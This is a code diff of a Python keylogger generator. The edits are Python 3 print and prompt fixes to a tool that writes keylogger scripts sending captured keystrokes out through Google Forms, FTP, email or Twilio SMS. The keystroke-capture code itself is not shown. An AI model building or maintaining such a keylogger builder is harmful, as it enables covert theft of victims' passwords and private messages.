@@ -62,8 +62,8 @@ def local():
         with open("local.py", "wb") as f:
             f.write(_local_)
 
-        print ('[~] Your local keylogger has been created in {0}').\
-        format(os.path.abspath('local.py'))
+        print (('[~] Your local keylogger has been created in {0}').\
+                format(os.path.abspath('local.py')))
 
     def _form(self):
         formId = input('[?] Enter your Google Form ID: ')
@@ -87,11 +87,10 @@ def form():
         ''').format(self.size, formId, entryId)
 
         _form_ += code()._Outkeys_().replace('local()', 'form()')
-        with open("form.py", "wb") as f:
+        with open("form.py", "w") as f:
             f.write(_form_)
 
-        print ('[~] Your Remote Google Form keylogger has been created in {0}').\
-        format(os.path.abspath('form.py'))
+        print (('[~] Your Remote Google Form keylogger has been created in {0}').format(os.path.abspath('form.py')))
 
     def _ftp(self):
         server = input('[?] Enter your ftp host: ')
@@ -141,8 +140,8 @@ def ftp():
         with open("ftp.py", "wb") as f:
             f.write(_ftp_)
 
-        print ('[~] Your FTP keylogger has been created in {0}').\
-        format(os.path.abspath('ftp.py'))
+        print (('[~] Your FTP keylogger has been created in {0}').\
+                format(os.path.abspath('ftp.py')))
     
     def _email(self):
         username = input('[-] Enter your E-Mail: ')
@@ -152,7 +151,7 @@ def ftp():
         print ('[~] Select your email server')
         while 1:
             try:
-                server = int(input('1. Gmail\n2. Hotmail\n3. Yahoo\n4. Not listed in here'))
+                server = int(input('1. Gmail\n2. Hotmail\n3. Yahoo\n4. Not listed in here\n>>'))
             except ValueError:
                 print ('[!] Enter only a number')
                 continue
@@ -224,8 +223,8 @@ Subject: %s
         with open("emailer.py", "wb") as f:
             f.write(_email_)
 
-        print ('[~] Your FTP keylogger has been created in {0}').\
-        format(os.path.abspath('emailer.py'))
+        print (('[~] Your E-Mail keylogger has been created in {0}').\
+                format(os.path.abspath('emailer.py')))
 
     def _sms(self):
         sid = input('[?] Enter your Twilio Account SID: ')
@@ -252,8 +251,8 @@ def sms():
         with open("sms.py", "wb") as f:
             f.write(_sms_)
 
-        print ('[~] Your SMS keylogger has been created in {0}').\
-        format(os.path.abspath('sms.py'))
+        print (('[~] Your SMS keylogger has been created in {0}').\
+                format(os.path.abspath('sms.py')))
         
    
 class code:
@@ -383,7 +382,7 @@ def main():
         if choice == 6: exit(0)
         while 1:
             try:
-                size = int(input('Enter your size: '))
+                size = int(input('\n[*] Enter your size: '))
             except ValueError:
                 print ('[!] Enter only a number')
                 continue
